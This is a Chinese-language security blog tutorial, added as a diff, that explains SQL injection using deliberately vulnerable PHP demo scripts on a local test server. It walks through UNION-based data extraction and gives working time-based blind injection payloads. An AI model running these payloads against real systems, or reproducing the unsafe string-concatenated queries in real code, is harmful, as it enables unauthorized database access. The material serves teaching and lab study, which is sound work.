@@ -1,0 +1,1347 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next mist use-motion" lang="zh-Hans">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+  
+  
+  
+  
+
+  
+    
+    
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+    
+    
+    <link href="//fonts.googleapis.com/css?family=Lato:300,300italic,400,400italic,700,700italic&subset=latin,latin-ext" rel="stylesheet" type="text/css">
+  
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.3" rel="stylesheet" type="text/css" />
+
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/favicon.ico?v=5.1.3">
+
+
+
+
+
+
+
+  <meta name="keywords" content="Hexo, NexT" />
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="以PHP讲解常见WEB安全漏洞">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Web Security">
+<meta property="og:url" content="http://www.lxhsec.com/2018/11/13/Web/index.html">
+<meta property="og:site_name" content="lyxhh">
+<meta property="og:description" content="以PHP讲解常见WEB安全漏洞">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="http://www.lxhsec.com/2018/11/13/Web/Demodata.png">
+<meta property="og:image" content="http://www.lxhsec.com/2018/11/13/Web/mysqlinjection1.png">
+<meta property="og:image" content="http://www.lxhsec.com/2018/11/13/Web/mysqlunion1.png">
+<meta property="og:image" content="http://www.lxhsec.com/2018/11/13/Web/mysqlorderby.png">
+<meta property="og:image" content="http://www.lxhsec.com/2018/11/13/Web/mysqlorderby1.png">
+<meta property="og:image" content="http://www.lxhsec.com/2018/11/13/Web/mysqlorderby2.png">
+<meta property="og:image" content="http://www.lxhsec.com/2018/11/13/Web/mysqlorderby3.png">
+<meta property="og:image" content="http://www.lxhsec.com/2018/11/13/Web/mysqlunion2.png">
+<meta property="og:image" content="http://www.lxhsec.com/2018/11/13/Web/mysqlunion3.png">
+<meta property="og:image" content="http://www.lxhsec.com/2018/11/13/Web/mysqlunion4.png">
+<meta property="og:image" content="http://www.lxhsec.com/2018/11/13/Web/mysqlunion5.png">
+<meta property="og:image" content="http://www.lxhsec.com/2018/11/13/Web/mysqlunion6.png">
+<meta property="og:image" content="http://www.lxhsec.com/2018/11/13/Web/mysqlunion7.png">
+<meta property="og:image" content="http://www.lxhsec.com/2018/11/13/Web/mysqlunion8.png">
+<meta property="og:image" content="http://www.lxhsec.com/2018/11/13/Web/mysqlunion9.png">
+<meta property="og:image" content="http://www.lxhsec.com/2018/11/13/Web/mysqlunion10.png">
+<meta property="og:image" content="http://www.lxhsec.com/2018/11/13/Web/sql_time_blind01.png">
+<meta property="og:image" content="http://www.lxhsec.com/2018/11/13/Web/sql_time_blind02.png">
+<meta property="og:image" content="http://www.lxhsec.com/2018/11/13/Web/sql_time_blind03.png">
+<meta property="og:image" content="http://www.lxhsec.com/2018/11/13/Web/sql_time_blind08.png">
+<meta property="og:image" content="http://www.lxhsec.com/2018/11/13/Web/sql_time_blind07.png">
+<meta property="og:image" content="http://www.lxhsec.com/2018/11/13/Web/sql_time_blind04.png">
+<meta property="og:image" content="http://www.lxhsec.com/2018/11/13/Web/sql_time_blind05.png">
+<meta property="og:image" content="http://www.lxhsec.com/2018/11/13/Web/sql_time_blind06.png">
+<meta property="og:image" content="http://www.lxhsec.com/2018/11/13/Web/ssrf1.png">
+<meta property="og:image" content="http://www.lxhsec.com/2018/11/13/Web/ssrf2.png">
+<meta property="og:image" content="http://www.lxhsec.com/2018/11/13/Web/ssrf_file.png">
+<meta property="og:image" content="http://www.lxhsec.com/2018/11/13/Web/ssrf_dict.png">
+<meta property="og:image" content="http://www.lxhsec.com/2018/11/13/Web/dict_nodisplay.png">
+<meta property="og:image" content="http://www.lxhsec.com/2018/11/13/Web/ssrf5.png">
+<meta property="og:image" content="http://www.lxhsec.com/2018/11/13/Web/include1.png">
+<meta property="og:image" content="http://www.lxhsec.com/2018/11/13/Web/Apache_log_LFI.png">
+<meta property="og:image" content="http://www.lxhsec.com/2018/11/13/Web/Apache_log_LFI1.png">
+<meta property="og:image" content="http://www.lxhsec.com/2018/11/13/Web/Apache_log_LFI2.png">
+<meta property="og:image" content="http://www.lxhsec.com/2018/11/13/Web/Session_include1.png">
+<meta property="og:image" content="http://www.lxhsec.com/2018/11/13/Web/Session_include2.png">
+<meta property="og:image" content="http://www.lxhsec.com/2018/11/13/Web/Session_include3.png">
+<meta property="og:image" content="http://www.lxhsec.com/2018/11/13/Web/phpinfoinclude.png">
+<meta property="og:image" content="http://www.lxhsec.com/2018/11/13/Web/phpinfoinclude2.png">
+<meta property="og:image" content="http://www.lxhsec.com/2018/11/13/Web/include2.png">
+<meta property="og:image" content="http://www.lxhsec.com/2018/11/13/Web/include3.png">
+<meta property="og:image" content="http://www.lxhsec.com/2018/11/13/Web/include6.png">
+<meta property="og:image" content="http://www.lxhsec.com/2018/11/13/Web/include7.png">
+<meta property="og:image" content="http://www.lxhsec.com/2018/11/13/Web/include4.png">
+<meta property="og:image" content="http://www.lxhsec.com/2018/11/13/Web/include5.png">
+<meta property="og:image" content="http://www.lxhsec.com/2018/11/13/Web/include8.png">
+<meta property="og:image" content="http://www.lxhsec.com/2018/11/13/Web/include9.png">
+<meta property="og:image" content="http://www.lxhsec.com/2018/11/13/Web/url_include1.png">
+<meta property="og:image" content="http://www.lxhsec.com/2018/11/13/Web/url_include2.png">
+<meta property="og:image" content="http://www.lxhsec.com/2018/11/13/Web/url_include3.png">
+<meta property="og:image" content="http://www.lxhsec.com/2018/11/13/Web/url_include4.png">
+<meta property="og:image" content="http://www.lxhsec.com/2018/11/13/Web/php_protocol1.png">
+<meta property="og:image" content="http://www.lxhsec.com/2018/11/13/Web/php_protocol_file.png">
+<meta property="og:image" content="http://www.lxhsec.com/2018/11/13/Web/php_protocol_php1.png">
+<meta property="og:image" content="http://www.lxhsec.com/2018/11/13/Web/php_protocol_php2.png">
+<meta property="og:image" content="http://www.lxhsec.com/2018/11/13/Web/php_protocol_php3.png">
+<meta property="og:image" content="http://www.lxhsec.com/2018/11/13/Web/php_protocol_php6.png">
+<meta property="og:image" content="http://www.lxhsec.com/2018/11/13/Web/php_protocol5.png">
+<meta property="og:image" content="http://www.lxhsec.com/2018/11/13/Web/php_protocol_php4.png">
+<meta property="og:image" content="http://www.lxhsec.com/2018/11/13/Web/xxe1.png">
+<meta property="og:image" content="http://www.lxhsec.com/2018/11/13/Web/xxe4.png">
+<meta property="og:image" content="http://www.lxhsec.com/2018/11/13/Web/xxe2.png">
+<meta property="og:image" content="http://www.lxhsec.com/2018/11/13/Web/xxe3.png">
+<meta property="og:image" content="http://www.lxhsec.com/2018/11/13/Web/xxeremote1.png">
+<meta property="og:image" content="http://www.lxhsec.com/2018/11/13/Web/xxeremote4.png">
+<meta property="og:image" content="http://www.lxhsec.com/2018/11/13/Web/xxeremote2.png">
+<meta property="og:image" content="http://www.lxhsec.com/2018/11/13/Web/xxeremote3.png">
+<meta property="og:image" content="http://www.lxhsec.com/2018/11/13/Web/windows1.png">
+<meta property="og:image" content="http://www.lxhsec.com/2018/11/13/Web/windows2.png">
+<meta property="og:image" content="http://www.lxhsec.com/2018/11/13/Web/windows3.png">
+<meta property="og:image" content="http://www.lxhsec.com/2018/11/13/Web/windows4.png">
+<meta property="og:image" content="http://www.lxhsec.com/2018/11/13/Web/linux1.png">
+<meta property="og:image" content="http://www.lxhsec.com/2018/11/13/Web/linux2.png">
+<meta property="og:image" content="http://www.lxhsec.com/2018/11/13/Web/linux3.png">
+<meta property="og:image" content="http://www.lxhsec.com/2018/11/13/Web/linux4.png">
+<meta property="og:image" content="http://www.lxhsec.com/2018/11/13/Web/linux5.png">
+<meta property="og:image" content="http://www.lxhsec.com/2018/11/13/Web/oscommand.png">
+<meta property="og:image" content="http://www.lxhsec.com/2018/11/13/Web/dns.jpeg">
+<meta property="og:image" content="http://www.lxhsec.com/2018/11/13/Web/mysqldnslog.png">
+<meta property="og:image" content="http://www.lxhsec.com/2018/11/13/Web/mysqldnslog1.jpg">
+<meta property="og:image" content="http://www.lxhsec.com/2018/11/13/Web/mysqldnslog2.png">
+<meta property="og:image" content="http://www.lxhsec.com/2018/11/13/Web/mysqldnslog3.png">
+<meta property="og:image" content="http://www.lxhsec.com/2018/11/13/Web/dnslogos0.png">
+<meta property="og:image" content="http://www.lxhsec.com/2018/11/13/Web/dnslogos1.png">
+<meta property="og:image" content="http://www.lxhsec.com/2018/11/13/Web/dnslogos2.png">
+<meta property="og:image" content="http://www.lxhsec.com/2018/11/13/Web/dnslogxxe.png">
+<meta property="og:updated_time" content="2019-02-24T13:44:02.960Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="Web Security">
+<meta name="twitter:description" content="以PHP讲解常见WEB安全漏洞">
+<meta name="twitter:image" content="http://www.lxhsec.com/2018/11/13/Web/Demodata.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Mist',
+    version: '5.1.3',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://www.lxhsec.com/2018/11/13/Web/"/>
+
+
+
+
+
+  <title>Web Security | lyxhh</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">lyxhh</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            归档
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br />
+            
+            关于
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://www.lxhsec.com/2018/11/13/Web/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="lyxhh">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/1.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="lyxhh">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">Web Security</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-11-13T20:34:02+08:00">
+                2018-11-13
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p>以PHP讲解常见WEB安全漏洞<a id="more"></a></p>
+<h2 id="SQL-Injection"><a href="#SQL-Injection" class="headerlink" title="SQL Injection"></a>SQL Injection</h2><p><strong>0x01 相关背景介绍</strong><br>结构化查询语言（Structured Query Language，缩写：SQL），是一种特殊的编程语言，用于数据库中的标准数据查询语言。<br>1986年10月，美国国家标准学会对SQL进行规范后，以此作为关系式数据库管理系统的标准语言（ANSI X3. 135-1986），1987年得到国际标准组织的支持下成为国际标准。<br>不过各种通行的数据库系统在其实践过程中都对SQL规范作了某些编改和扩充。所以，实际上不同数据库系统之间的SQL不能完全相互通用。</p>
+<p>SQL注入（SQL Injection）是一种常见的Web安全漏洞，攻击者利用这个问题，可以访问或修改数据，或者利用潜在的数据库漏洞进行攻击。</p>
+<p><strong>0x02 成因</strong><br>针对SQL注入的攻击行为可描述为：通过在用户可控参数中注入SQL语法，破坏原有SQL结构，达到编写程序时意料之外结果的攻击行为。其成因可以归结为以下两个原因叠加造成的：</p>
+<ol>
+<li>程序编写者在处理应用程序和数据库交互时，使用字符串拼接的方式构造SQL语句</li>
+<li>未对用户可控参数进行足够的过滤便将参数内容拼接进入到SQL语句中</li>
+</ol>
+<p><strong>0x03 攻击方式和危害</strong></p>
+<p>3.1 攻击方式<br>SQL注入的攻击方式根据应用程序处理数据库返回内容的不同，可以分为可显注入、报错注入和盲注：</p>
+<ul>
+<li>可显注入：攻击者可以直接在当前界面内容中获取想要获得的内容</li>
+<li>报错注入：数据库查询返回结果并没有在页面中显示，但是应用程序将数据库报错信息打印到了页面中，所以攻击者可以构造数据库报错语句，从报错信息中获取想要获得的内容</li>
+<li>盲注：数据库查询结果无法从直观页面中获取，攻击者通过使用数据库逻辑或使数据库库执行延时等方法获取想要获得的内容</li>
+</ul>
+<p>3.2危害<br>危害根据Web应用程序连接数据库的用户权限决定。</p>
+<p>root权限(可直接写Shell，跨库注入等，MSSQL SA权限 甚至可直接提权拿服务器)</p>
+<p>普通用户权限(读取该用户所属数据库的信息)</p>
+<p><strong>下面以Mysql数据库来讲解SQL注入。</strong></p>
+<p>1.首先准备环境</p>
+<p>测试环境为(若无特别声明，以下所有注入操作均在此环境下执行)，</p>
+<p>PHP Version 5.3.29<br>Windows10<br>Mysql 5.5.40<br>Apache/2.4.10 (Win32) </p>
+<p>2.准备一个查询数据库的Demo。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div></pre></td><td class="code"><pre><div class="line"><span class="comment">//sqli.php</span></div><div class="line"><span class="meta">&lt;?php</span></div><div class="line">header(<span class="string">"Content-type: text/html; charset=utf-8"</span>);</div><div class="line"></div><div class="line">$id = $_GET[<span class="string">'id'</span>];</div><div class="line">$conn = mysqli_connect(<span class="string">"localhost"</span>, <span class="string">"test"</span>,<span class="string">"test"</span>,<span class="string">"test"</span>);</div><div class="line"></div><div class="line"><span class="keyword">if</span> (!$conn)&#123;</div><div class="line">	<span class="keyword">die</span>(<span class="string">"Database Connection failed: "</span> . mysqli_connect_error());</div><div class="line">&#125;</div><div class="line"></div><div class="line">$sql = <span class="string">"select * from test where id = $id"</span>;</div><div class="line">$result = mysqli_query($conn, $sql);</div><div class="line"></div><div class="line"><span class="keyword">if</span> (mysqli_num_rows($result) &gt; <span class="number">0</span>)&#123;</div><div class="line">	<span class="keyword">while</span>($row = mysqli_fetch_assoc($result) )&#123;</div><div class="line">		<span class="keyword">echo</span> <span class="string">'user_id: '</span> . $row[<span class="string">'id'</span>].<span class="string">"&lt;br /&gt;"</span>;</div><div class="line">		<span class="keyword">echo</span> <span class="string">'user: '</span> . $row[<span class="string">'username'</span>].<span class="string">"&lt;br /&gt;"</span>;</div><div class="line">	&#125;</div><div class="line">	</div><div class="line">&#125;<span class="keyword">else</span>&#123;</div><div class="line">	<span class="keyword">echo</span> <span class="string">"check Sql"</span>;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="keyword">echo</span> <span class="string">"执行的sql语句: $sql"</span>;</div><div class="line"></div><div class="line">mysqli_close($conn);</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure>
+<p>3.准备数据<br><img src="/2018/11/13/Web/Demodata.png" alt="Demodata"></p>
+<h3 id="UNION-query-based"><a href="#UNION-query-based" class="headerlink" title="UNION query-based"></a>UNION query-based</h3><hr>
+<p>Mysql数据库结构<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div></pre></td><td class="code"><pre><div class="line">Mysql</div><div class="line">    -A  数据库A</div><div class="line">		—table1</div><div class="line">			-columns1</div><div class="line">				-data</div><div class="line">			-columns2</div><div class="line">				-data</div><div class="line">			-columns3</div><div class="line">				....</div><div class="line">			-columns4</div><div class="line">		-table2</div><div class="line">			-columns1</div><div class="line">			-columns2</div><div class="line">			-columns3</div><div class="line">			-columns4			-</div><div class="line">		-table3	</div><div class="line">			-columns1</div><div class="line">			-columns2</div><div class="line">			-columns3</div><div class="line">			-columns4</div><div class="line">	-B  数据库B</div><div class="line">		—table1</div><div class="line">			-columns1</div><div class="line">			-columns2</div><div class="line">			....</div><div class="line">	-C  数据库B</div><div class="line">		—table1</div><div class="line">			-columns1</div><div class="line">			-columns2</div><div class="line">			....</div><div class="line">[*]小结：</div><div class="line">1.Mysql数据库中有很多数据库，每个数据库里面又有很多的表，每个表中又有很多列，数据存放在列下面，</div><div class="line">2.查询数据时，通过指定数据库，表，列名，找到存储的数据。</div></pre></td></tr></table></figure></p>
+<p>先来看一下Mysql的一些函数。<br>Version()  查询当前Web应用程序所使用的数据库版本<br>user()  查询当前Web应用程序所连接的用户名<br>database() 查询当前Web应用程序所使用的数据库名</p>
+<p>information_schema 这个数据库包含了Mysql数据库里面所有的数据库，所有的表，所有的列，(Mysql5.0版本以上才有information_schema)</p>
+<p>information_schema.schemata schemata表存储mysql下所有的数据库<br>符号”.”代表下一级的意思代表下一级的意思，information_schema数据库下面的schemata表，<br>information_schema.tables  tables表存储mysql下所有的表名<br>information_schema.columns columns表存储mysql下所有的列名<br>table_schema 表名来自哪个数据库<br>Column_name 列名<br>Table_name  表名<br>Schema_name 数据库名</p>
+<p>打开sqli.php<br><a href="127.0.0.1/sqli.php?id=1">127.0.0.1/sqli.php?id=1</a></p>
+<p><img src="/2018/11/13/Web/mysqlinjection1.png" alt="mysqlinjection1"></p>
+<p>ok，接下来我们怎么去利用，进而查询到我们数据库中存储的password数据呢?</p>
+<p>在Mysql中，有一种查询叫做联合查询，Union<br>UNION 操作符用于连接两个以上的 SELECT 语句的结果组合到一个结果集合中.<br>在我们使用UNION查询的时候，UNION后面的select查询语句查询的列数个数要与前面的列数数量一致。<br><img src="/2018/11/13/Web/mysqlunion1.png" alt="mysqlunion1"></p>
+<p>如何获得Web应用程序查询的列数呢？可以通过order by num获得<br><img src="/2018/11/13/Web/mysqlorderby.png" alt="mysqlorderby"><br>num表示表中列的位置，最左边的列是1。</p>
+<p><img src="/2018/11/13/Web/mysqlorderby1.png" alt="mysqlorderby1"><br>当order by 3时，Mysql查询出错，因为查询结果中没有第三行的列，由此我们可以知道，列数为2.</p>
+<p>对sqli.php继续注入</p>
+<p><img src="/2018/11/13/Web/mysqlorderby2.png" alt="mysqlorderby2"></p>
+<p><img src="/2018/11/13/Web/mysqlorderby3.png" alt="mysqlorderby3"></p>
+<p>当我们执行order by 4 的时候，Web应用程序出错了，可得列数没有第四列。那么当前应用程序连接的数据库的字段数就是3个。</p>
+<p>接着使用UNION联合查询，报出了数字1，2，因为1，2是回显在页面上，因此我们可以在1，2上注入，结果也将显示到页面上。<br><img src="/2018/11/13/Web/mysqlunion2.png" alt="mysqlunion2"></p>
+<p>首先我们来判断数据库的版本，来理清渗透思路。(Mysql5.0以上是根据information_schema数据库进行的注入，而Mysql5.0以下则数据暴力猜解，没有依据。)<br><img src="/2018/11/13/Web/mysqlunion3.png" alt="mysqlunion3"></p>
+<p>接着继续查询连接当前数据库的数据库用户名，理清渗透思路。得知为普通用户，那么思路也就清晰了，注入数据库找后台账号密码。<br><img src="/2018/11/13/Web/mysqlunion4.png" alt="mysqlunion4"></p>
+<p>在讲解数据库结构时，提到，要想得到数据，要指定具体的数据库名，表，字段，因此接下来猜数据库名，接着找表，接着找列，最后猜数据。<br><img src="/2018/11/13/Web/mysqlunion5.png" alt="mysqlunion5"></p>
+<p>根据information_schema.tables表找表名。<br><img src="/2018/11/13/Web/mysqlunion6.png" alt="mysqlunion6"></p>
+<p>根据information_schema.columns表找列名<br><img src="/2018/11/13/Web/mysqlunion7.png" alt="mysqlunion7"></p>
+<p>爆数据<br><img src="/2018/11/13/Web/mysqlunion8.png" alt="mysqlunion8"></p>
+<p>limit限制输出行<br><img src="/2018/11/13/Web/mysqlunion9.png" alt="mysqlunion9"></p>
+<p>group_concat<br><img src="/2018/11/13/Web/mysqlunion10.png" alt="mysqlunion10"></p>
+<h3 id="Time-based-blind"><a href="#Time-based-blind" class="headerlink" title="Time-based blind"></a>Time-based blind</h3><p>当Sql语句执行后，WEB应用程序不将数据返回前端展示时，可以通过盲注的方式获取我们想要的数据。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">先来了解几个函数。</div><div class="line">sleep(x) -- 延迟函数，延迟多少秒取决于x的值。</div><div class="line">length(x) -- 查看x字符串的长度。</div><div class="line">if(x,1,0) -- 判断函数，若x为真的执行1，假0.</div><div class="line">mid(database(),start,length) -- mid函数用于得到一个字符串的一部分，例如mid(user,1,1)=&apos;u&apos; 即 user 从1开始长度为1的字符是否等于u。</div><div class="line">database() --查看当前使用的数据库名</div><div class="line">Ascii（）--返回字符的ascii码</div></pre></td></tr></table></figure>
+<p>测试代码：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></td><td class="code"><pre><div class="line"><span class="comment">//sqli_blind.php</span></div><div class="line"><span class="meta">&lt;?php</span></div><div class="line">header(<span class="string">"Content-type: text/html; charset=utf-8"</span>);</div><div class="line">$id = $_GET[<span class="string">'id'</span>];</div><div class="line">$conn = mysqli_connect(<span class="string">"localhost"</span>, <span class="string">"root"</span>,<span class="string">"root"</span>,<span class="string">"test"</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">"Database Connection failed: "</span> . mysqli_connect_error());</div><div class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($id))&#123;</div><div class="line">	$sql = <span class="string">"select * from lxhsec where id = '$id'"</span>;</div><div class="line">	$result = mysqli_query($conn, $sql);</div><div class="line">	<span class="keyword">if</span> (mysqli_num_rows($result) &gt; <span class="number">0</span>)&#123;</div><div class="line">		<span class="keyword">echo</span> <span class="string">'&lt;pre&gt;User ID exists in the database.&lt;/pre&gt;'</span>;</div><div class="line">		</div><div class="line">	&#125;<span class="keyword">else</span>&#123;</div><div class="line">		<span class="keyword">echo</span> <span class="string">'&lt;pre&gt;User ID is MISSING from the database.&lt;/pre&gt;'</span>;</div><div class="line">	&#125;</div><div class="line">	<span class="keyword">echo</span> <span class="string">"执行的sql语句: $sql"</span>;</div><div class="line">	mysqli_close($conn);</div><div class="line">&#125;<span class="keyword">else</span>&#123;</div><div class="line">	<span class="keyword">echo</span> <span class="string">'please set id argument'</span>;</div><div class="line">&#125;</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure></p>
+<p>判断注入<br><img src="/2018/11/13/Web/sql_time_blind01.png" alt="sql_time_blind01"></p>
+<p>判断数据库长度<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">http://127.0.0.1/sqli_blind.php?id=1&apos; and if((length(database())&gt;3),sleep(5),0)%23</div><div class="line"></div><div class="line">分析: </div><div class="line">database() - 获取WEB应用程序当前连接的数据库名。</div><div class="line">↓</div><div class="line">length(database()) - 获取数据库名长度。</div><div class="line">↓</div><div class="line">(length(database())&gt;3) - 数据库名的长度大于3。</div><div class="line">↓</div><div class="line">if((length(database())&gt;3),sleep(5),0)</div><div class="line"></div><div class="line">判断数据库长度是否大于3，若是，则延迟5秒，否则返回0.</div></pre></td></tr></table></figure></p>
+<p><img src="/2018/11/13/Web/sql_time_blind02.png" alt="sql_time_blind02"></p>
+<p>判断数据库名<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">http://127.0.0.1/sqli_blind.php?id=1&apos; and if((ascii(mid(database(),1,1))=116),sleep(5),0)%23</div><div class="line"></div><div class="line">分析:</div><div class="line">mid(database(),1,1) - 截取数据库名第一个字符</div><div class="line">↓</div><div class="line">(ascii(mid(database(),1,1))=116)  - 第一个字符的ascii码等于116</div><div class="line">↓</div><div class="line">if((ascii(mid(database(),1,1))=116),sleep(5),0)</div><div class="line"></div><div class="line">判断数据库名第一位的ascii是否等于116，若是，则延迟5秒，否则返回0.</div></pre></td></tr></table></figure></p>
+<p><img src="/2018/11/13/Web/sql_time_blind03.png" alt="sql_time_blind03"></p>
+<p>判断表名数量<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://127.0.0.1/sqli_blind.php?id=1&apos; and if((ascii(mid((select count(table_name) from information_schema.tables where table_schema=database()),1,1))=50),sleep(5),0)%23</div></pre></td></tr></table></figure></p>
+<p><img src="/2018/11/13/Web/sql_time_blind08.png" alt="sql_time_blind08"></p>
+<p>判断表名长度<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://127.0.0.1/sqli_blind.php?id=1&apos; and if((length((select table_name from information_schema.tables where table_schema=database() limit 0,1))&gt;=3),sleep(5),0)%23</div></pre></td></tr></table></figure></p>
+<p><img src="/2018/11/13/Web/sql_time_blind07.png" alt="sql_time_blind07"></p>
